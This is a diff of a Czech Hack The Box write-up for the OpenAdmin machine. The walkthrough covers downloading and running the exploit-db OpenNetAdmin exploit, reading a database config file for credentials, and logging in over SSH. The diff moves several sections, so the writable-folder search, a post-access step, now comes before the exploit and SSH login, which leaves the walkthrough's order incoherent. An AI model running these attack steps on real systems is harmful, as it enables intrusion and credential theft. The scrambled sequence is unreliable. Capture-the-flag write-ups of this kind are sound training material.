@@ -22,12 +22,12 @@ IP=10.10.10.171;ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d 
 ```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
 |   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
 |_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET POST OPTIONS HEAD
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Apache2 Ubuntu Default Page: It works
@@ -102,16 +102,13 @@ while true;do
 curl https://www.exploit-db.com/raw/47691 -o opennetadmin-exploit.sh
 ```
 
-## Získání přístupu
+### Vyhledání zapisovatelných složek
 
-### Spuštění exploitu
-
-V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
-
+```bash
+find / -type d -writable 2> /dev/null
 ```
-dos2unix opennetadmin-exploit.sh
-chmod +x opennetadmin-exploit.sh
-./opennetadmin-exploit.sh "http://openadmin.htb/ona/"
+```
+/var/www/internal
 ```
 
 ## Analýza zjištění
@@ -138,11 +135,11 @@ cat ./local/config/database_settings.inc.php
 ```
 ```
 $ona_contexts=array (
-  'DEFAULT' => 
+  'DEFAULT' =>
   array (
-    'databases' => 
+    'databases' =>
     array (
-      0 => 
+      0 =>
       array (
         'db_type' => 'mysqli',
         'db_host' => 'localhost',
@@ -157,29 +154,6 @@ $ona_contexts=array (
   ),
 );
 ```
-
-## Získání přístupu
-
-### Přihlášení k SSH pomocí nalezeného hesla
-
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
-
-```bash
-ssh jimmy@openadmin.htb
-```
-
-## Počáteční průzkum
-
-### Vyhledání zapisovatelných složek
-
-```bash
-find / -type d -writable 2> /dev/null
-```
-```
-/var/www/internal
-```
-
-## Analýza zjištění
 
 ### Zjištění konfigurace webu
 
@@ -206,6 +180,24 @@ AssignUserID joanna joanna
 ```
 
 ## Získání přístupu
+
+### Spuštění exploitu
+
+V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
+
+```
+dos2unix opennetadmin-exploit.sh
+chmod +x opennetadmin-exploit.sh
+./opennetadmin-exploit.sh "http://openadmin.htb/ona/"
+```
+
+### Přihlášení k SSH pomocí nalezeného hesla
+
+Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+
+```bash
+ssh jimmy@openadmin.htb
+```
 
 ### Přihlášení k SSH s přesměrováním portů
 
